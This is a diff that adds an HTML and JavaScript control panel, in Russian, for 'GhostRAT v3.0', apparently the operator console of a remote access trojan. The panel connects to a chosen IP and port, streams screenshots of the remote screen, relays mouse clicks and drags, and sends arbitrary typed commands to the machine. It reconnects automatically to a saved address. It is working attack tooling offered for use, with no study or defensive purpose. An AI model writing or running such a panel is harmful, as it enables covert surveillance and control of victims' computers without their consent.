@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostRAT Control</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:10px}
+        h1{color:#00ff41;text-align:center;font-size:20px;margin-bottom:10px;text-shadow:0 0 20px #00ff41}
+        .config{background:#111;border:1px solid #00ff41;border-radius:8px;padding:10px;margin-bottom:10px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:center}
+        .config input{padding:8px 12px;background:#0a0a0a;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:'Courier New',monospace;font-size:14px;width:200px}
+        .config button{padding:8px 16px;background:#00ff41;color:#0a0a0a;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
+        .config button:hover{background:#00cc33}
+        .status{display:flex;flex-wrap:wrap;gap:15px;justify-content:center;padding:8px;font-size:13px;background:#0a0a0a;border-radius:4px;margin-bottom:10px}
+        .status .online{color:#44ff44}
+        .status .offline{color:#ff4444}
+        #canvasWrap{position:relative;border:2px solid #00ff41;border-radius:8px;background:#000;max-width:100%;margin:0 auto}
+        #screenCanvas{display:block;width:100%;height:auto;cursor:crosshair}
+        #loading{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#00ff41;font-size:24px;animation:pulse 1.5s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.2}}
+        .controls{display:flex;flex-wrap:wrap;gap:5px;justify-content:center;padding:10px;background:#111;border:1px solid #00ff41;border-radius:8px;margin-top:10px}
+        .controls button,.controls select,.controls input{padding:6px 12px;background:#0a0a0a;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:'Courier New',monospace;font-size:12px;cursor:pointer}
+        .controls button{background:#00ff41;color:#0a0a0a;font-weight:bold}
+        .controls button.danger{background:#ff0000;color:#fff}
+        .controls button.danger:hover{background:#cc0000}
+        .controls input{flex:1;min-width:120px}
+        .log{max-height:120px;overflow-y:auto;background:#0a0a0a;border:1px solid #1a3a1a;border-radius:4px;padding:5px 10px;margin-top:10px;font-size:11px;color:#666}
+        .log .cmd{color:#00ff41}
+        .log .resp{color:#44aaff}
+        .log .err{color:#ff4444}
+        .log .info{color:#888}
+        ::-webkit-scrollbar{width:4px}
+        ::-webkit-scrollbar-track{background:#0a0a0a}
+        ::-webkit-scrollbar-thumb{background:#00ff41;border-radius:2px}
+        .footer{text-align:center;margin-top:15px;font-size:11px;color:#333}
+    </style>
+</head>
+<body>
+
+<h1>👁️ GHOSTRAT CONTROL</h1>
+
+<div class="config">
+    <span style="color:#00ff41;font-size:14px;">СЕРВЕР:</span>
+    <input type="text" id="serverInput" value="localhost:8080" placeholder="IP:PORT">
+    <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ</button>
+    <span id="connStatus" style="font-size:14px;">● <span id="connText">отключен</span></span>
+</div>
+
+<div class="status">
+    <span>📡 FPS: <span id="fpsDisplay">0</span></span>
+    <span>📥 Кадров: <span id="frameCount">0</span></span>
+    <span>⏱️ Задержка: <span id="latency">0</span>ms</span>
+    <span>🖱️ <span id="mouseCoords">0, 0</span></span>
+</div>
+
+<div id="canvasWrap">
+    <canvas id="screenCanvas"></canvas>
+    <div id="loading">⏳ ПОДКЛЮЧЕНИЕ...</div>
+</div>
+
+<div class="controls">
+    <button class="danger" id="btnStart">▶ СТАРТ</button>
+    <button id="btnStop">⏹ СТОП</button>
+    <button id="btnLMB">🖱️ ЛКМ</button>
+    <button id="btnRMB">🖱️ ПКМ</button>
+    <button id="btnDbl">🖱️ 2x</button>
+    <button id="btnScr">📸 СКРИН</button>
+    <select id="intervalSelect">
+        <option value="100">100 мс</option>
+        <option value="200" selected>200 мс</option>
+        <option value="500">500 мс</option>
+        <option value="1000">1 сек</option>
+    </select>
+    <input type="text" id="cmdInput" placeholder="Команда...">
+    <button id="sendBtn">➡️</button>
+</div>
+
+<div class="log" id="log">
+    <div class="info">[SYSTEM] Готов. Укажи IP сервера и нажми ПОДКЛЮЧИТЬ.</div>
+</div>
+
+<div class="footer">GhostRAT v3.0 | @zazayaga</div>
+
+<script>
+// ================================================================
+// ВЕСЬ КОД РАБОТАЕТ ЧЕРЕЗ УКАЗАННЫЙ СЕРВЕР (IP:PORT)
+// ================================================================
+
+let serverUrl = 'http://localhost:8080';
+let streaming = false;
+let intervalId = null;
+let frameCount = 0;
+let fps = 0;
+let fpsCounter = 0;
+let fpsTimer = 0;
+let screenW = 0, screenH = 0;
+let canvasW = 0, canvasH = 0;
+let mouseX = 0, mouseY = 0;
+let isDragging = false;
+let isConnected = false;
+
+const canvas = document.getElementById('screenCanvas');
+const ctx = canvas.getContext('2d');
+const loading = document.getElementById('loading');
+const logDiv = document.getElementById('log');
+
+// ===== ЛОГ =====
+function log(text, cls = 'info') {
+    const d = document.createElement('div');
+    d.className = cls;
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + text;
+    logDiv.appendChild(d);
+    logDiv.scrollTop = logDiv.scrollHeight;
+    if (logDiv.children.length > 150) logDiv.removeChild(logDiv.firstChild);
+}
+
+// ===== ОТПРАВКА КОМАНДЫ НА СЕРВЕР =====
+function sendCommand(cmd, cb = null) {
+    if (!isConnected) {
+        log('✗ Сначала подключись к серверу!', 'err');
+        return;
+    }
+    if (!cmd) return;
+    log('→ ' + cmd, 'cmd');
+
+    fetch(serverUrl + '/api', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'cmd=' + encodeURIComponent(cmd)
+    })
+    .then(r => r.text())
+    .then(data => {
+        if (data.length > 200) {
+            log('✓ ' + data.length + ' байт', 'resp');
+        } else {
+            log('✓ ' + data, 'resp');
+        }
+        if (cb) cb(data);
+    })
+    .catch(err => {
+        log('✗ ' + err, 'err');
+        setConnectionStatus(false);
+        if (cb) cb('ERROR:' + err);
+    });
+}
+
+// ===== СТАТУС ПОДКЛЮЧЕНИЯ =====
+function setConnectionStatus(online) {
+    isConnected = online;
+    const dot = document.getElementById('connStatus');
+    const text = document.getElementById('connText');
+    if (online) {
+        dot.innerHTML = '●';
+        dot.style.color = '#44ff44';
+        text.textContent = 'онлайн';
+        text.style.color = '#44ff44';
+    } else {
+        dot.innerHTML = '●';
+        dot.style.color = '#ff4444';
+        text.textContent = 'отключен';
+        text.style.color = '#ff4444';
+    }
+}
+
+// ===== ПОДКЛЮЧЕНИЕ К СЕРВЕРУ =====
+function connectToServer() {
+    const input = document.getElementById('serverInput').value.trim();
+    if (!input) {
+        log('✗ Введи IP:PORT (например, 192.168.1.100:8080)', 'err');
+        return;
+    }
+    // Добавляем http:// если нет
+    let url = input;
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        url = 'http://' + url;
+    }
+    serverUrl = url;
+    log('🔗 Подключение к ' + serverUrl + '...', 'info');
+
+    // Проверяем доступность
+    fetch(serverUrl + '/api', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'cmd=ping'
+    })
+    .then(r => r.text())
+    .then(data => {
+        setConnectionStatus(true);
+        log('✅ Подключено к ' + serverUrl, 'resp');
+        // Автоматически запускаем стрим
+        setTimeout(startStream, 300);
+    })
+    .catch(err => {
+        setConnectionStatus(false);
+        log('✗ Не удалось подключиться: ' + err, 'err');
+    });
+}
+
+// ===== ЗАПРОС КАДРА =====
+function fetchFrame() {
+    if (!streaming || !isConnected) return;
+    const t0 = performance.now();
+
+    sendCommand('screenshot', function(data) {
+        document.getElementById('latency').textContent = Math.round(performance.now() - t0);
+
+        if (data && data.startsWith('SCREEN:')) {
+            const b64 = data.substring(7);
+            const img = new Image();
+            img.onload = function() {
+                if (screenW === 0) {
+                    screenW = img.width;
+                    screenH = img.height;
+                    const maxW = window.innerWidth - 20;
+                    const maxH = window.innerHeight - 300;
+                    const ratio = screenW / screenH;
+                    canvasW = Math.min(screenW, maxW);
+                    canvasH = canvasW / ratio;
+                    if (canvasH > maxH) {
+                        canvasH = maxH;
+                        canvasW = canvasH * ratio;
+                    }
+                    canvas.width = canvasW;
+                    canvas.height = canvasH;
+                    canvas.style.width = canvasW + 'px';
+                    canvas.style.height = canvasH + 'px';
+                    loading.style.display = 'none';
+                    setConnectionStatus(true);
+                }
+                ctx.drawImage(img, 0, 0, canvasW, canvasH);
+                frameCount++;
+                document.getElementById('frameCount').textContent = frameCount;
+                fpsCounter++;
+                const now = performance.now();
+                if (now - fpsTimer > 1000) {
+                    fps = fpsCounter;
+                    fpsCounter = 0;
+                    fpsTimer = now;
+                    document.getElementById('fpsDisplay').textContent = fps;
+                }
+            };
+            img.onerror = function() {
+                log('✗ Ошибка декодирования изображения', 'err');
+            };
+            img.src = 'data:image/png;base64,' + b64;
+        } else if (data && data.startsWith('ERROR:')) {
+            log('✗ ' + data, 'err');
+        }
+    });
+}
+
+// ===== УПРАВЛЕНИЕ СТРИМОМ =====
+function startStream() {
+    if (streaming) return;
+    if (!isConnected) {
+        log('✗ Сначала подключись к серверу', 'err');
+        return;
+    }
+    streaming = true;
+    frameCount = 0;
+    fpsCounter = 0;
+    fpsTimer = performance.now();
+    screenW = 0;
+    screenH = 0;
+    loading.style.display = 'block';
+    log('▶ СТРИМ ЗАПУЩЕН', 'info');
+
+    const interval = parseInt(document.getElementById('intervalSelect').value);
+    fetchFrame();
+    intervalId = setInterval(fetchFrame, interval);
+}
+
+function stopStream() {
+    streaming = false;
+    if (intervalId) {
+        clearInterval(intervalId);
+        intervalId = null;
+    }
+    loading.style.display = 'none';
+    log('⏹ СТРИМ ОСТАНОВЛЕН', 'info');
+}
+
+// ===== ОТПРАВКА КЛИКА =====
+function sendClick(x, y, btn = 'left', count = 1) {
+    if (!streaming) { log('✗ Запусти стрим', 'err'); return; }
+    if (canvasW === 0 || canvasH === 0) return;
+    const rect = canvas.getBoundingClientRect();
+    const rx = Math.round(x * (screenW / rect.width));
+    const ry = Math.round(y * (screenH / rect.height));
+    sendCommand('click ' + rx + ' ' + ry + ' ' + btn + ' ' + count);
+    log('🖱️ ' + btn + ' (' + rx + ',' + ry + ')', 'cmd');
+}
+
+// ===== СОБЫТИЯ МЫШИ НА КАНВАСЕ =====
+canvas.addEventListener('click', function(e) {
+    const r = canvas.getBoundingClientRect();
+    sendClick(e.clientX - r.left, e.clientY - r.top, 'left', 1);
+});
+
+canvas.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    const r = canvas.getBoundingClientRect();
+    sendClick(e.clientX - r.left, e.clientY - r.top, 'right', 1);
+});
+
+canvas.addEventListener('dblclick', function(e) {
+    const r = canvas.getBoundingClientRect();
+    sendClick(e.clientX - r.left, e.clientY - r.top, 'left', 2);
+});
+
+canvas.addEventListener('mousemove', function(e) {
+    const r = canvas.getBoundingClientRect();
+    mouseX = e.clientX - r.left;
+    mouseY = e.clientY - r.top;
+    document.getElementById('mouseCoords').textContent = Math.round(mouseX) + ', ' + Math.round(mouseY);
+
+    if (isDragging) {
+        const rx = Math.round(mouseX * (screenW / r.width));
+        const ry = Math.round(mouseY * (screenH / r.height));
+        sendCommand('mousemove ' + rx + ' ' + ry);
+    }
+});
+
+canvas.addEventListener('mousedown', function(e) {
+    if (e.button === 0) {
+        isDragging = true;
+        const r = canvas.getBoundingClientRect();
+        sendClick(e.clientX - r.left, e.clientY - r.top, 'down', 1);
+    }
+});
+
+canvas.addEventListener('mouseup', function(e) {
+    if (e.button === 0 && isDragging) {
+        isDragging = false;
+        const r = canvas.getBoundingClientRect();
+        sendClick(e.clientX - r.left, e.clientY - r.top, 'up', 1);
+    }
+});
+
+// ===== КНОПКИ =====
+document.getElementById('connectBtn').addEventListener('click', connectToServer);
+document.getElementById('serverInput').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') connectToServer();
+});
+
+document.getElementById('btnStart').addEventListener('click', startStream);
+document.getElementById('btnStop').addEventListener('click', stopStream);
+document.getElementById('btnLMB').addEventListener('click', () => sendClick(mouseX, mouseY, 'left', 1));
+document.getElementById('btnRMB').addEventListener('click', () => sendClick(mouseX, mouseY, 'right', 1));
+document.getElementById('btnDbl').addEventListener('click', () => sendClick(mouseX, mouseY, 'left', 2));
+
+document.getElementById('btnScr').addEventListener('click', function() {
+    sendCommand('screenshot', function(data) {
+        if (data && data.startsWith('SCREEN:')) {
+            const a = document.createElement('a');
+            a.href = 'data:image/png;base64,' + data.substring(7);
+            a.download = 'screenshot_' + Date.now() + '.png';
+            a.click();
+            log('📸 Скриншот сохранён', 'resp');
+        }
+    });
+});
+
+document.getElementById('sendBtn').addEventListener('click', function() {
+    const inp = document.getElementById('cmdInput');
+    if (inp.value.trim()) {
+        sendCommand(inp.value.trim());
+        inp.value = '';
+    }
+});
+document.getElementById('cmdInput').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') document.getElementById('sendBtn').click();
+});
+
+// ===== КЛАВИША ПРОБЕЛ =====
+document.addEventListener('keydown', function(e) {
+    if (e.key === ' ' && e.target.tagName !== 'INPUT') {
+        e.preventDefault();
+        streaming ? stopStream() : startStream();
+    }
+});
+
+// ===== АВТОПОДКЛЮЧЕНИЕ =====
+setConnectionStatus(false);
+log('[SYSTEM] GhostRAT v3.0 загружен', 'info');
+log('[SYSTEM] Введи IP сервера (например, 192.168.1.100:8080) и нажми ПОДКЛЮЧИТЬ', 'info');
+log('[SYSTEM] Или просто нажми ENTER в поле ввода', 'info');
+
+// Если есть сохранённый сервер в localStorage - подгружаем
+const savedServer = localStorage.getItem('ghostrat_server');
+if (savedServer) {
+    document.getElementById('serverInput').value = savedServer;
+    setTimeout(connectToServer, 500);
+}
+
+// Сохраняем сервер при подключении
+document.getElementById('connectBtn').addEventListener('click', function() {
+    localStorage.setItem('ghostrat_server', document.getElementById('serverInput').value.trim());
+});
+</script>
+</body>
+</html>
